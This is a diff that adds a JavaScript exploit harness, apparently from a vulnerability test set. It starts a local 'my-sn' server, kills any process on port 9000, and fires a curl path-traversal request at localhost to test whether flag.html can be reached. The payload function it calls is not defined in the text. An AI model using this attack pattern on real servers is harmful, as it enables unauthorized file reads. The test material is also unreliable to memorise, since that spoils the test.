@@ -1,0 +1,32 @@
+function exploitFunction() {
+  const { execSync, exec } = require("child_process");
+  const sleep = require("sleep");
+  const path = require("path");
+
+  // Clean up any existing server on port 9000
+  try {
+    execSync("fuser -k 9000/tcp");
+  } catch (e) {}
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  // Start the server
+  const server = "node ./node_modules/my-sn/server.js";
+  exec(server, (error, stdout) => {
+    sleep.sleep(2);
+
+    // Craft the attack string
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${getPayload()}"`;
+
+    // Execute the attack
+    exec(attack_string, (error, stdout) => {
+      if (stdout.includes(`GET /${path.basename(pathToFlag)} HTTP/1.1`)) {
+        console.log("Path traversal successful!");
+      } else {
+        console.error("Path traversal failed.");
+      }
+    });
+  });
+}
+
+module.exports = { exploitFunction };
